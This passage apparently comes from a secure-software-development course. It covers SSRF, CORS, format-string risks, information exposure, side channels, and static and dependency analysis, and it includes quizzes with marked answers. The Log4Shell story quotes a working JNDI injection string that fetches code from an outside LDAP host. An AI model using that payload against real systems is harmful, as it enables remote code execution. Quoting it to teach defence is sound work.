The main solution is to ensure that you greatly limit how you construct any URLs that you request. If possible, don’t use untrusted data to create these URLs. If you must use untrusted data to construct a URL (and this often occurs), maximally limit the URLs that can be constructed and ensure that only *safe* URLs can be constructed. For example, in many cases today you can limit the URL to a single scheme (**https:**), and there is usually no need to allow (for example) ports or usernames.

🔔 Server-Side Request Forgery (SSRF) is such a common cause of security vulnerabilities that it is 2021 OWASP Top 10 #10, 2021 CWE Top 25 #24, and 2019 CWE Top 25 #30. It is [CWE-918](https://cwe.mitre.org/data/definitions/918.html).

#### Quiz 4.9: Using Inadequately Checked URLs / Server-Side Request Forgery (SSRF)

\>\>URLs are merely ways to locate information, so validating them is not important. True or False?<<

( ) True

(x) False

[Explanation]

Not at all! If possible, don’t use untrusted data to create these URLs. If you must (and you often must), maximally limit the URLs that can be constructed and ensure that only *safe* URLs can be constructed.

[Explanation]

### Same-Origin Policy and Cross-Origin Resource Sharing (CORS)

[Web Application]

When a web browser gets an HTML file, the HTML file is allowed to freely refer to images, videos, CSS stylesheets, and scripts to run. Normally the web browser will attempt to retrieve and use them, regardless of what website those materials come from.

However, when a web browser retrieves and runs a script (such as JavaScript), it would be dangerous for the web browser to allow that script to easily interact with arbitrary websites. If that were allowed, a malicious script could surreptitiously send private data to any other site, and the script could also attack other websites (e.g., by exploiting vulnerabilities or launching a DDoS attack).

To prevent many security problems, web browsers normally enforce on client-side JavaScript programs a set of rules called the *same-origin policy*. Under the same-origin policy, client-side JavaScript programs are only allowed to interact with the same *origin*, including viewing any resources. The origin of a URL is the combination of the protocol (usually https), port (443 by default for https), and host. Thus, **<https://example.com/foo>** and **<https://example.com/bar>** are considered to have the same origin because they have the combination (https, 443, example.com). The purpose of the same-origin policy is to isolate potentially malicious documents (Mozilla, [*Same-Origin Policy*](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)).

The same-origin policy prevents many security issues, but it is sometimes too strict. A website can specifically allow interaction by JavaScript from other origins by using Cross-Origin Resource Sharing (CORS). CORS can be useful, since it relaxes the restrictions of the same-origin policy. CORS can also be a problem, since CORS can enable vulnerabilities if it is poorly used. CORS is specified in great detail in the [WHATWG Fetch specification](https://fetch.spec.whatwg.org/#http-extensions). Mozilla has a nice description of CORS in their [documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). In this unit, we will briefly cover the highlights, summarizing some of the material from the Mozilla CORS documentation.

In brief: CORS allows web servers to declare what other origins are allowed access to what resources (URLs), and which HTTP verbs (**GET**, **POST**, **DELETE**, etc.) are permitted to those other origins. Web browsers request this information and use it to determine if client-side JavaScript programs are allowed to make a cross-origin request (that is, an action outside their origin). This information is exchanged using new HTTP headers that are output by the web browser and web server. CORS requests are used for cross-origin **XMLHttpRequest** and **Fetch** requests (among other circumstances).

There are two kinds of CORS requests, a (so-called) *simple request* and a *preflighted request*. This is an optimization. Simple requests use a single interaction, while successful preflighted requests use two interactions. Any CORS request that cannot be done with a simple request is automatically implemented by the web browser with a preflighted request. Preflighted requests have more latency than a simple request, so where you *can*, write your client-side code so it will use CORS simple requests. Sometimes that is not possible, and then a higher-latency preflighted request will automatically be used.

A CORS simple request is used when *all* of the following are true:

* The requested method is **GET**, **HEAD**, or **POST**

* The request headers are only the ones automatically set by the web browser (aka user agent), optionally extended with *CORS-safelisted request-headers*. Examples of these safelisted headers are **Accept**, **Accept-Language**, **Content-Language**, **Viewport-Width**, and **Width**.

* The **Content-Type** header is one of: **application/x-www-form-urlencoded**, **multipart/form-data**, or **text/plain**.

* A few other requirements are also met. See the specification for details; in most cases these other requirements will be met.

When a CORS simple request is made, the web browser makes the request as usual and also sets the HTTP header **Origin** to the script origin. The web server then determines if that request is acceptable. The web server then replies and sets the HTTP header **Access-Control-Allow-Origin** with information about the allowed origin(s). If that value is “**&#42;**”, then *any* origin is allowed that access. The web browser looks at the **Access-Control-Allow-Origin**, and if the requesting origin matches, the script receives any information returned.

A preflighted request, unlike a simple request, uses an extra step. In a preflighted request, the web browser first sends an **OPTIONS** request with the **Origin** and other information, to ask the web server if the actual request is “*safe to send*”. If the web server approves it, then the actual request is sent. Some browsers do not follow redirects for a preflighted request; see the [Mozilla CORS documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) for solutions if it matters to you.

By default, browsers will not send credentials (cookies and HTTP Authentication information) in a CORS request. However, a specific flag can be set on an  **XMLHttpRequest** object or **Request** constructor to send credentials. If this is done, the web server must return **Access-Control-Allow-Credentials: true** or the JavaScript program will not receive the results. Web servers should be very cautious about using this; if it is used at all, be very picky about the origins allowed. It is much safer to *not* use **Access-Control-Allow-Credentials**, as this allows credentialed programmatic control from a different origin.

If you intend for some information to be publicly readable on your web server, and it never varies (no matter who requested it or where it is from), consider returning “**Access-Control-Allow-Origin: &#42;**” when a web browser tries to **GET** that information. This allows client-side JavaScript programs to directly retrieve that information and use it further. That does allow JavaScript programs to repeatedly request it, so in theory that makes DDoS attacks slightly easier. However, for many websites the goal is to distribute some information, and DDoS can be countered in other ways.

Sometimes the information may vary depending on the origin of the requestor (this is true if you set an **Access-Control-Allow-Origin** to any value other than “**&#42;**”). In these cases, ensure that you include a “**Vary**” header with the value “**Origin**”. This “**Vary**” value tells the web browser that the result may vary depending on the origin, preventing information from one origin from leaking into another origin (or lack of origin) via CORS.

Details on how to enable CORS for a large variety of circumstances is available at [enable-cors.org](https://enable-cors.org/). You can also check out the following resources for more details:

* [Web Hypertext Application Technology Working Group (WHATWG).](https://fetch.spec.whatwg.org/)[*Fetch*](https://fetch.spec.whatwg.org/)

* [Mozilla’s](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[*Same-origin policy*](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[documentation](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

* [Mozilla’s Cross-Origin Resource Sharing (CORS) documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS).

### Format Strings and Templates

Producing results can be complicated. Almost all programming languages have special mechanisms to make output easier; even the original 1956 version of FORTRAN did ([*The FORTRAN Automatic Coding System for IBM 704 EDPM: Programmer’s Reference Manual*](https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf), 1956)! These mechanisms include various kinds of format string and template systems. These mechanisms can be very powerful and speed development. They can also be critical for countering vulnerabilities; one of the best ways to counter the Cross-Site Scripting (XSS) attacks is to use a templating system that counters it by default, as we have already discussed.

However, *be very careful* about letting untrusted users control the output formats (that is, using format strings and templates from untrusted users). In many cases, you should *not* let untrusted users set output formats that are used by general-purpose templating systems without carefully validating them first. Some output format systems can execute arbitrary code, or reveal information beyond a specific set of approved values - and you *definitely* should not allow that in most cases! Even when they cannot run *arbitrary* code, by definition they control the output, and they may be able to create misleading results or results that overwhelm wherever the output goes.

The C programming language output routines are especially dangerous, because their design assumes that the format string parameters are from trusted sources. For example, the **printf()** family of routines (including **fprintf** and **snprintf**) takes a *format string* parameter; if an attacker can control the format string, then the attacker can trivially make the result arbitrarily long (often leading to a buffer overflow), print any memory area (revealing confidential information or data that enables a security bypass), or use the **%n** operation to overwrite arbitrary memory areas. The same is true for **syslog()** (which writes system log information) and **setproctitle()** (which sets the string used to display process identifier information). Many functions with names beginning with “**err**” or “**warn**”, containing “**log**”, or ending in “**printf**” are worth reviewing.

Most other programming languages’ format systems are not quite that dangerous, but they can still cause problems. The best solution is to make sure that an untrusted user cannot provide the format string. If circumstances require that you allow that, *make sure* that the system you use cannot allow a vulnerability, e.g., by only allowing specific kinds of formats (be sure to validate that!), or use a library that is specifically designed to be safely used with untrusted templates. Even in those cases, remember that if a user can control the output template, the user can produce a copious amount of output. Ensure that this is not a serious issue (e.g., by ensuring that only that same user sees the results from that template, so attackers only end up attacking themselves).

Many output formatting systems have a way to support internationalization (**i18n**) and localization (**l10n**). The widely-used **gettext()** system, for example, lets you select a string (including a format string or template) using the user’s current locale. The value of the locale would typically be provided by an untrusted user. However, that is okay as long as its only effect is to select between format strings or templates, all of which you know you can trust.

> 😱 STORY TIME: Log4Shell / log4j

> log4j is a software component written in Java that implements logging (recording events for later auditing and debugging). It is widely used for logging, including by Apple iPhones, Teslas, and Minecraft chat. Log4Shell (formally CVE-2021-44228) is an extremely serious vulnerability in the log4j 2.X series. In vulnerable versions of log4j, "an attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.” (NVD, [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) It's easy to trigger; an attacker can include logged text with forms like `${jndi:ldap://45.83.193.150:1389/Exploit}`. There were almost 8,000 tests in the log4j project, but none found this; the tests showed that expected functions worked, but didn't ensure that this undesired functionality would not work. This is an example of allowing untrusted users to control the output format, in this case enabling the execution of arbitrary code. Be wary of giving untrusted users this dangerous level of control!


#### Quiz 4.10: Format Strings and Templates

\>\>Select all the true statement(s).<<

[!x] Where practical, do not allow untrusted users to control the format/template used when formatting output.

[x] C’s design presumes that format string parameters are from trusted sources.

[ ] Having a mechanism to simplify output formatting is unusual in programming languages.

### Minimize Feedback / Information Exposure

Avoid giving security or sensitive information to untrusted users. If a request is privileged, simply succeed or fail, and if it fails just say that it failed and minimize information on why it failed. In short, minimize feedback to untrusted users if it might compromise security, and instead send the detailed information to audit trail logs. For example:

* If your program requires some sort of user authentication (e.g., you are writing a network service or login program), give the user as little information as possible before they authenticate. In particular, avoid giving away the version number of your program before authentication. Otherwise, if a particular version of your program is found to have a vulnerability, then users who don’t upgrade from that version advertise to attackers that they are vulnerable.

* If your program accepts a password, by default don’t show the full password while it's being entered. At most, show the most recently entered character. Showing the full password while it's entered may enable others to see the password. In HTML forms, set the input type to password, which intentionally limits the feedback. Many user interfaces allow users to select showing sensitive information by pressing an eye icon; that's fine, because the display is by specific user request instead of by default.

* On a failed login, just say “*username or password failed*” or similar - don’t expose whether it was the username or the password that failed. That could tell the attacker that the username is valid, and makes further attacks easier.

* If a user tries to create an account using an email address, don't tell the user if an account with that email address already exists. Similarly, if a user tries to do a password reset using an email address, don't tell the user if there is no account with that email address. Providing that information would allow an attacker to determine if a specific email address is being used (or not) by some existing account.

* In general, don’t display sensitive/private data by default unless necessary at that point.

Implement audit logging early in development. Then, if you need to record more detailed information to aid debugging, report that information in the logs instead of displaying it to the user. Audit logs are really convenient for debugging (because they are designed to record useful information without interfering with normal operations), and you are more likely to include useful status information in the logs if they are developed in parallel with the rest of the program. They will also reduce the temptation to reveal too much to untrusted users.

Also, ensure that users cannot receive unauthorized information. Permissions and namespaces should be clearly set to prevent this.

🔔 Improper information exposure is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #20 and 2019 CWE Top 25 #4. It is identified as [CWE-200](https://cwe.mitre.org/data/definitions/200.html), *Exposure of Sensitive Information to an Unauthorized Actor* (aka *Information Exposure*).

#### Quiz 4.11: Minimize Feedback / Information Exposure

\>\>If an untrusted user connects into your system over a network, and a request fails, you should provide them with a detailed stack trace. True or False?<<

( ) True

(x) False

[Explanation]

We hope this was a really easy one. The problem is not just that this is a terrible user experience; it could also lead to a security breach. Untrusted users should normally be told if some request failed, but there is no reason they must see all that detail; that is what logs are for.

[Explanation]

### Side-Channel Attacks

In some cases, the software you develop may send security-relevant output that you did not intend to send.

A *side-channel attack* is an attack where an attacker gains unauthorized information by exploiting how the software is implemented (instead of a weakness in an algorithm or a defect). There are many different kinds of side-channel attacks; here are some examples:

* Timing attack — an attack based on measuring the time taken by different computations. It is even possible to perform some timing attacks over a network, since modern statistics can counter a significant amount of jitter.

* Cache attack — an attack based on monitoring cache accesses, typically on a shared physical environment (such as cloud service).

* Power-monitoring attack — an attack based on observing varying electrical power consumption.

* Data remanence — an attack based on reading data after it was thought to be deleted.

Cryptographic systems are often the targets of these attacks, so libraries that implement cryptography should be specially implemented to try to counter such attacks. We will discuss this in more detail when we discuss cryptography.

If you need to counter these kinds of attacks, beyond what is required for cryptography, side-channel attacks can be difficult to thwart. If it is extremely important to counter side-channel attacks, it is often better to pay to eliminate the resource sharing and access that enable side channels. For example, if cache attacks are a serious concern, you may choose to use single-purpose hardware or pay a cloud provider to reduce sharing (e.g., to use a single-tenant architecture). Power-monitoring attacks can be countered by making it difficult for an attacker to measure electrical use.

Thankfully, other than attacks on cryptographic systems, side-channel attacks are less common today. Most developers need to focus on the other issues discussed in this course, and only then (in more specialized circumstances) do they need to worry about side-channel attacks. Attackers will typically not bother trying to implement a side-channel attack if the software is riddled with easier-to-find vulnerabilities such as XSS and buffer overflows.

# Part II: Final Exam

* Not included as part of the free version of the course.

# Part III: Verification and More Specialized Topics

# Verification

This chapter describes how to verify for security, including the limitations of tools, the meaning of *static analysis* and *dynamic analysis*, and common types of tools such as security code scanners/static application security testing (SAST) tools, fuzzers, and web application scanners.

Learning objectives:

1. Understand verification tools, including the issues of false positives and false negatives.

2. Discuss common types of static analysis tools, including security code scanners/static application security testing (SAST) tools.

3. Discuss common types of dynamic analysis tools, including fuzzers and web application scanners.

## Basics of Verification

### Verification Overview

Verification can be defined as determining whether or not something complies with its requirements (including regulations, specifications, and so on). Testing is one verification approach, but verification is more than testing. We want to verify (to some reasonable level) that our software is secure, just like we want to verify that our software does other things it is supposed to do.

#### Verification Approaches

There are two main technical categories of verification:

* **Static analysis** is any approach for verifying software (including finding defects) without executing software. This includes tools that examine source code looking for vulnerabilities (e.g., source code vulnerability scanning tools). It also includes humans reading code, looking for problems.

* **Dynamic analysis** is any approach for verifying software (including finding defects) by executing software on specific inputs and checking the results. Traditional testing is a kind of dynamic analysis. Fuzz testing, where you send many *random* inputs to a program to see if it does something it should not, is also an example of dynamic analysis.

Some people also have a category called *hybrid analysis* for approaches that combine both, while others will include hybrid approaches in the dynamic analysis category.

#### True and False Reports

There is a long history of using various kinds of detectors to detect important situations, many of which have nothing to do with software. Smoke detectors, for example, attempt to detect smoke from dangerous fires. Sadly, detectors are never perfect.

In security we often want to use tools that find and report certain kinds of vulnerabilities. Ideally, such a vulnerability detection tool would always report exactly the vulnerabilities you want it to report, and nothing else. Again, such ideals rarely occur in reality. So a tool may report something or not, and that report or non-report may be correct or incorrect, leading to 4 possibilities:

<table>
  <tr>
    <td><b>Analysis/tool report</b></td>
    <td><b>Report correct</b></td>
    <td><b>Report incorrect</b></td>
  </tr>
  <tr>
    <td><b>Reported</b> (a defect)</td>
    <td><i>True positive (TP)</i>: Correctly reported (a defect)</td>
    <td><i>False positive (FP)</i>: Incorrect report (of a “defect” that’s not a defect) (“Type I error”)</td>
  </tr>
  <tr>
    <td><b>Did not report</b> (a defect (there))</td>
    <td><i>True negative (TN)</i>: Correctly did not report (a given defect)</td>
    <td><i>False negative (FN)</i>: Incorrect because it failed to report (a defect) (“Type II error”)</td>
  </tr>
</table>


The reality is that there is usually a trade-off between false positives and false negatives. Tools can be designed or configured to have fewer false positives (incorrect reports), but that lack of sensitivity typically means that it will often have more false negatives (it will fail to report things that you might expect it to report). For more details, see the [*SATE V Report: Ten Years of Static Analysis Tool Expositions*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.500-326.pdf), 2018.

#### Applying Tools

If you are adding a tool to an existing project, you may want to configure tools to greatly limit what they report, and focus just on the vulnerabilities you are most concerned about. This gives you time to learn how to *tune* the tool and understand its results. Then, once those results are addressed, increase the sensitivity of your tools or add more tools to detect more issues. There is no point in trying to detect more issues than you can deal with.

If you are adding tools to a newly-started project, you are often better off configuring your tools to be very sensitive. In a new project, you will not be overwhelmed by the reports, and you will immediately get feedback on the issues your tools can detect.

Where do you add these tools? In short, maximally add these tools to at least your continuous integration (CI) pipeline. That way, incremental changes will be repeatedly analyzed and security issues will be reported early.

Some tools are OSS, while others are proprietary. Some of the proprietary tools are expensive, but if you are using them to develop OSS, many tools and/or services are free to use or are available at a substantial discount.

So let’s look at some kinds of tools you can use to help make your software secure.

#### Quiz 1.1: Verification Overview

\>\>When using tools to look for security vulnerabilities, there is normally a risk of “false negatives” - that is, failing to report vulnerabilities even when they are present and the tool is designed to find that kind of vulnerability. True or False?<<

(x) True

( ) False

## Static Analysis

### Static Analysis Overview

Static analysis is any approach for verifying software (including finding defects) without executing software. This includes humans who review code. It also includes tools that review source code, byte code, and/or machine code.

#### Human Review

Humans can be amazing at finding defects. This is one of the big potential advantages of open source software (OSS); since anyone can review OSS source code to find defects, there is a potential mass peer review. But humans have their downsides. Human time is expensive, humans get bored, and humans have “off” days where they are less effective (e.g., they might miss things). Different humans have different levels of effectiveness, too. It’s great to have humans review code, but you also want to support humans with tools that will find problems the humans may miss.

If you can get humans to review code, do so! But you may want to direct the humans to examine issues that tools are especially not good at. In particular, it is good to have people review the “entry points” (attack surface) across a trust boundary to ensure that every request is either authorized or rejected. Determining whether or not a request is authorized is not something most tools are good at (they lack the information to make the decision). What is more, if that analysis is too hard for humans, there is something wrong with the software - it should be relatively *easy* to answer that question on each entry point.

In general, if there are problems that tools are not good at finding, it may be best to modify your design so the problem cannot happen in the first place. For example, choose a memory-safe language or design a system component so only safe requests can be made. If that does not work, it may be wise to try to find or develop a tool to find it. That said, there will always be issues that tools will not work well for. If nothing else works, then work to focus the most powerful tool of all on the problem: people. But people’s time is limited, so where you can, try to not depend *solely* on human review.

🔔 A human review process for code and configuration changes, to minimize the chance that malicious code or configuration could be introduced into your software pipeline, is part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*. Human review processes can help counter *Broken Access Control*, 2017 OWASP Top 10 #5 and 2021 OWASP Top 10 #1.

So with that said, let’s start discussing tools to help us.

#### Generic Bug-Finding Tools: Quality Tools, Compiler Warnings, and Type-Checking Tools

Some tools examine source code, byte code, or machine code to look for generic “quality” problems. For example, they may look for misleading indentation, combinations of constructs that usually indicate a defect, or overly-long methods that may be hard to understand later. There are a large variety of these, including compiler warning flags, style checkers, and so on. The tools themselves are often cheap or free, and they often run quickly, because they typically don’t need to do a deep analysis.

These tools often don’t focus on security, but using them can still help improve security:

1. Some defects they find are security vulnerabilities.

2. There are reports that *clean* code is easier for other tools and humans to understand… so fixing the reported problems can make other approaches more effective.

If you are starting a new project, it is important to turn on as many of these tools (including compiler warnings) as soon as you can. If you turn them on early, you will see a few reports recommending a different approach and just use that instead. If you try to add them to an *existing* project, you will often see far too many issues to fix, even though the odds of any one being a serious problem is small. So if you have an existing project, you typically need to add these tools slowly, configuring them to only report a subset (such as only reports triggered by a change) and then slowly expanding what they report.

Similar comments apply to static type-checking. Some programming languages have built-in checks for statically-declared types. There are pros and cons to statically-declared types. It takes time to determine and specify types, so doing that can slow down initial development, which is a negative for small and throw-away programs. However, those static declarations can help automatically finding certain kinds of defects, as well as aid support tools and optimization. If you are using a programming language with static type-checking, work with the type system to use it to help find defects early.

That said, while these tools are often easy to use, they generally are not focused on security issues… and thus they often miss security issues. Let’s talk about tools that use static analysis specifically to find security vulnerabilities.

#### Security Code Scanners/Static Application Security Testing (SAST) Tools

Some tools analyze code specifically looking for vulnerabilities. They go by a variety of names, such as Static Application Security Testing (SAST) tools, security code scanners, security source code scanners (if they examine source code), binary code scanners (if they only examine executables), or just *static code analyzers*. Some people use the term SAST only when the tool analyzes source code (for more details, see [*The AppSec alphabet soup: A guide to SAST, IAST, DAST, and RASP*](https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/) by Fred Bals, 2018, and [*10 Types of Application Security Testing Tools: When and How to Use Them*](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html) by Thomas Scanlon, 2018), but we will not limit the term that way.

The idea behind these tools is that many vulnerabilities have specific patterns. A tool designed to look for those patterns can report similar kinds of vulnerabilities.

The patterns are generally heuristic, and different tools generally look for different patterns. So one tool can find *some* vulnerabilities, but don’t make the mistake of thinking that any one of these tools finds *all* vulnerabilities. In addition, each tool will only look for patterns relevant to a particular set of languages/environments. That means these tools are only good for languages/environments they are designed to support, and in addition, a tool might be better at one language than another. Even given multiple tools designed to support a given language, different tools will often find vulnerabilities that others miss.

If your primary goal is to find as many vulnerabilities as possible, it is best to use multiple tools, even multiple tools of the same kind, so that a vulnerability not detected by one tool might be detected by another. Unfortunately, using multiple tools can get expensive in money and effort. Some tools are expensive, and no matter what, it takes time to configure the tool for its particular use and to analyze its reports. As often happens, there is a trade-off; the set of tools you select will be strongly influenced by the resources available, as well as the expected likelihood and impact of unfound vulnerabilities.

Of course, not everything reported by any of these tools is an *actual* vulnerability. All of these tools have some risk of generating a false positive. For example, a tool might detect a vulnerability triggered by some input, but you may know that only a trusted user can control that input… so while the tool is correct in one sense, it is not actually a vulnerability. In many cases, it is best to fix the report anyway; people are often wrong when they say something “can’t” happen, and the software or its environment may change in the future (so fixing it will future-proof the software). If you are confident the report is a false positive, and “fixing” the code to eliminate the report is not worth the trouble, most such tools have a way to disable the report (e.g., via a comment in the source code). That way, the tool will stop reporting about it; otherwise the tool reports will over time only have a large set of false positives. Just make sure that you only disable a report if you are *certain* it is a false positive.

#### Specialized Security Code Scanners/SAST Tools

Some tools are designed to only look for one or a very few specific kinds of vulnerabilities. These are still security code scanners, aka SAST tools, but since they are specially written to perform that one specific analysis, they can sometimes be better at that one analysis than a more general-purpose tool designed to find many different kinds of vulnerabilities. In addition, some more general-purpose tools don’t look for these specific problems at all.

Here are some kinds of vulnerabilities that specialized SAST tools can detect:

* Regular Expression Denial-of-Service (ReDoS) vulnerabilities (that is, regular expressions with terrible worst-case performance). You can look for terms like “ReDoS”, “evil regex”, and “safe regex”. These extract the regular expressions from source code, and then analyze the regular expressions.

* Hardcoded credentials such as cryptographic keys and passwords. Tools that look for hardcoded credentials are sometimes called “secret scanners”.

🔔 Hardcoded credentials are such a common problem that they are 2021 CWE Top 25 #16, [CWE-798](https://cwe.mitre.org/data/definitions/798.html), *Use of Hard-coded Credentials*. This is one reason why secret scanners have rapidly become popular.

#### Other Static Analysis Tools

There are many other kinds of static analysis tools.

One kind is so important that we will dedicate a whole separate section to it. The kind of analysis these tools do has a variety of names, including software composition analysis (SCA), dependency analysis, and origin analysis. No matter what it is called, it is important, so we will discuss that next.

#### Quiz 1.2: Static Analysis Overview

\>\>Security code scanners/static application security testing (SAST) tools examine code to look for vulnerabilities. They can be very useful, but such a tool could report no vulnerabilities even on software with vulnerabilities. True or False?<<

(x) True

( ) False

[Explanation]

This is true. They are useful, and in general you should use at least one such tool, but don’t be fooled into thinking that simply using such tools eliminates software vulnerabilities.

[Explanation]

### Software Composition Analysis (SCA)/Dependency Analysis

One kind of static analysis tool is so important that we want to discuss it separately. The kind of analysis these tools do has a variety of names, including software composition analysis (SCA), dependency analysis, and origin analysis. No matter what it is called, it is important. Let’s first examine *why* it is important.

#### Need for SCA

Long ago, software developers wrote most of the software in their application. Today, that is almost never the case. Instead, software developers typically reuse software packages that are mostly written by others, and then write only the specialized functionality and the glue code necessary to make things work together in the way desired. This also applies to reusable software packages; these packages typically depend on packages, which depend on others, and so on. The same is true for standalone operating systems, virtual machine images, and container images - they often include a lot of software written by others.

There are clear advantages to reusing software. One advantage is that it saves a lot of time (and money) - you don’t have to develop that code! Another advantage is that a reused package is often especially good at that task (since someone spent time specifically to solve that problem); these packages often handle edge cases you might otherwise forget.

But when you reuse software, there is a downside: that software will have vulnerabilities in it. You should try to pick software that is likely to have fewer vulnerabilities. But in general, vulnerabilities *will* be found in the software you use directly and indirectly; those vulnerabilities will be publicly announced, and updates to those components that fix the vulnerabilities will be released. Because most reused software is OSS, some people and companies call this examining for OSS. That is not quite right, because it is actually an issue for any reused software, but it is understandable that people focus on OSS because most reused software is OSS.

🔔 Using known-vulnerable components is such a common problem that in 2013 OWASP added *Using Components with Known Vulnerabilities* to the OWASP Top 10. Using components with known vulnerabilities is 2017 OWASP Top 10 #9. Using vulnerable and outdated components is 2021 OWASP Top 10 #6.

It is inevitable that you will need to quickly update vulnerable reused components, so you need to *prepare* to quickly detect and do security updates for the reused software in your applications.

#### Preparing for the Inevitable: Vulnerabilities in Your Dependencies

A key part of your preparation is to use a tool that can determine what software you reuse, and report on any publicly-known vulnerabilities in those reused components. Tools that can identify reused components have various names including software composition analysis (SCA) tools, software component analysis tools, dependency analysis tools, or origin analysis tools. Historically, many of these tools were developed for legal review, to ensure that all the reused software is being used in conformance to their licenses, that the licenses (as used) are compatible, and that there are licenses for all of it. It is a very good idea to include this kind of license analysis whenever you try to include or update any reused software. But for our purposes, we will focus on the tools that compare this list of components (including their version numbers) with databases of known vulnerabilities.

There are publicly-available databases of software with publicly known vulnerabilities; an especially widely-used database is the US National Vulnerability Database (NVD). The NVD is a publicly-available database of publicly-known vulnerabilities, all identified by a CVE identifier (each vulnerability has a different CVE identifier) combined with a list of products and version numbers which are known to have that vulnerability. Some commercial vendors have their own databases as well.

So, all an SCA tool has to do, in theory, is figure out what components (and their versions) are present, look up each one in one or more databases, and report on matches. Even detecting the components is not always easy; sometimes reused components are not obvious (e.g., because they were copy and pasted in, instead of being properly handled using a package manager). Even more fundamentally, however, databases are constantly updated as new vulnerabilities are found. That means that reused software that had no known vulnerabilities earlier might now *have* a known vulnerability. Even if the vulnerability was publicly known earlier, that fact might not have been recorded in earlier versions of the database(s) used by the tool. So these tools must be periodically rerun, or have the comparisons rerun, so that you become aware of newly-found vulnerabilities.

You should avoid some bad behavior to make these tools more useful. Some developers copy reused code from other packages into their application, instead of using a package manager to automate identifying and updating reused packages. Even worse, developers sometimes *modify* these copies and/or check in these copies (creating a fork). Some SCA tools can actually examine code line-by-line, identify such likely copies, and connect them back to their sources (to help identify vulnerabilities). But such SCA tools are more complex, often expensive to buy and use, and trying to *update* that software is often quite difficult because everything is being done manually. In addition, such SCA tools must necessarily use heuristics to detect such situations, which may miss such components anyway.

It is far better to apply some good practices. First, when reusing software, use a package manager to manage it, one that records the specific version numbers in a standard format that you can record in your version control system. By using a standard format, you can use far simpler SCA tools, and the data will be more accurate. By using a package manager you can trivially cause a software update and check that the new set of components works.

But who decides how fast you need to update your reused components? That is a tricky question. Some people may say, “my company policy”, “my chief information security officer” (CISO), “my chief information office” (CIO), or something like that. All of those answers are wrong answers. If your goal is to have a secure system, then the correct answer is that the **_attackers_** *decide when you need to update*! That’s because you need to get the updated version deployed before an attacker exploits that vulnerability in your deployed system.

Speed is important when a component you depend on has a publicly-known vulnerability, and you *know* that this will happen sometimes. So trying to handle this completely manually is a mistake. You should instead make sure that:

1. You have at least one SCA tool that automatically reports to you when there is a known vulnerability in a component that your system uses.

2. You can easily update a component using a simple command, generally by telling a package manager to switch to a different version of that component and checking that change in.

3. You can automatically test the modified configuration to ensure that updating the component does not break anything important.

4. You can quickly deploy it (if you deploy directly) and/or distribute it (if you distribute the software to others).

If your automated tests are not good enough to make it acceptable to deploy updated components, then you have a serious security problem. Needing to update reused components is inevitable - not just a possibility - in most software. If the components you use are so out-of-date that you cannot update to a supported version, that is also a serious problem… because again, needing to update a component for a vulnerability is generally inevitable.

Like all tools, SCAs are prone to false positives. In particular, a component may have a vulnerability, but only when certain methods are used or only in certain configurations. If you don’t use the component in a way that the vulnerability can be exploited, then of course you don’t need to update the component. But this is a little misleading. It is often hard to be *certain* that you don’t need to do the update. In addition, if you have a proper process where you can easily update components ― and you need to ― then it often takes more time to determine (for sure) that the vulnerability is not exploitable than to just do the update. What’s more, time spent to figure this out may give an attacker time to exploit it if it is a real vulnerability. So it is often better to just update, even if it is not certain to be exploitable.

There are lots of SCAs available. If you use GitHub or GitLab, they provide some basic SCA reporting of known vulnerabilities in many components for free (assuming that you use a standard package management format they can process). Linux Foundation projects can use LFx (formerly CommunityBridge) which provides this service. There are a variety of suppliers that provide or sell such tools. This includes OWASP Dependency Check (which is OSS), Sonatype’s Nexus products, Synopsys’ Black Duck, Ion Channel Solutions, and Snyk. Some package managers include this capability or have a plug-in for it (e.g. Ruby’s **bundler** has **bundle-audit**). This is definitely *not* a complete list, and no doubt you will want to compare the options.

The key is that most software reuses other software, and that vulnerabilities will occasionally be found in that reused software.

#### Quiz 1.3: Software Composition Analysis (SCA)/Dependency Analysis

\>\>Select all the true statement(s) about handling dependencies:<<

[!x] Tools can be used to help you identify which software dependencies have publicly-known vulnerabilities.

[ ] Software composition analysis (SCA) tools can be used to find all software dependencies with vulnerabilities. {{ selected: No, such tools attempt to determine the software dependencies, and then compare that to their database of known vulnerabilities. However, they might not identify all dependencies or the vulnerability might not be in their database. The vulnerability might not be publicly known, and even if it is, there is no guarantee that the tool database contains *all* publicly known vulnerabilities. }}

[ ] To keep software secure in operations, update your reused components within the time required by your company policy. {{ selected: False, the *attacker* decides when you need to update. The updated version needs to be deployed before an attacker attacks that deployed system using that vulnerability. If your company policy says you have a week, and the attacker subverts your system within a day, your system was still subverted. }}

[x] To keep software secure in operations, ensure that there are automatic reports of known vulnerabilities in your dependencies, that you can easily update dependencies, that you can automatically test the modified configuration, and that you can quickly deploy or distribute as appropriate.

[ ] Automated tests are a nice-to-have, but not necessary for security, when you have dependencies. {{selected: False, because you must be prepared for a rapid update when a dependency has a publicly-known exploit. Without automated tests, it is impractical to rapidly gain enough confidence to deploy the update in time. }}

## Dynamic Analysis

### Dynamic Analysis Overview

Dynamic analysis is any approach for verifying software (including finding defects) by executing software on specific inputs and checking the results. We will look at a few kinds of tools that do this, but first, let’s discuss their limitations.

#### Limitations to Dynamic Analysis

All dynamic analysis tools have a fundamental limitation: it is impossible to evaluate all possible inputs in a reasonable amount of time. It is not even possible to evaluate a *reasonable subset*.

